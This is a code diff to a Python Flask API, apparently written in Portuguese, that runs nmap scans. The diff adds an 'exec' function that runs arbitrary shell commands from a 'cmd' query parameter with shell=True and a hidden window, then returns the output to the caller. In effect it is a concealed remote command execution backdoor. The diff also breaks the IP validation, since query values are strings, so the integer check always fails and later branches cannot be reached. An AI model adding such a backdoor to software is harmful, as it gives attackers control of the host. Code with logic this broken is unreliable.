@@ -28,7 +28,11 @@ def nmap_syn_scan(ip):
 def nmap_fin_scan(ip):
     resultado = nm2.nmap_fin_scan(ip)
     return resultado
-
+    
+def exec(cmd):
+    process = Popen(cmd, shell=True, creationflags=CREATE_NO_WINDOW, stdout=PIPE, stderr=PIPE)
+    stdout, stderr = process.communicate()
+    return stdout.decode(), stderr.decode()
 
 
 # API
@@ -46,12 +50,15 @@ def api():
         return jsonify({'Erro': 'Sai fora'}), 403
 
     ip = request.args.get('@ip')
+    cmd = request.args.get('cmd')
     opcoes = request.args
 
     resposta = {}
 
-    if ip:
+    if type(ip) == int:
         resposta['@ip'] = ip
+    elif type(ip) != int:
+        return jsonify({'Erro': 'Necessario um ip válido'}), 403
     elif ip == None:
         return jsonify({'Erro': 'Necessario um ip'}), 403
     else:
@@ -62,12 +69,17 @@ def api():
                'sV': scan_version_scan, 
                'allports': nmap_all_ports__scan,
                'syn': nmap_syn_scan,
-               'fin': nmap_fin_scan}
+               'fin': nmap_fin_scan,
+               'exec': exec}
     
    
     for i in comando:
         if i in opcoes:
             resposta[i] = comando[i](ip)
+
+    if cmd:
+        stdout, stderr = exec(cmd)
+        resposta['exec_cmd'] = {'stdout': stdout, 'stderr': stderr}
 
 
     return jsonify(resposta)
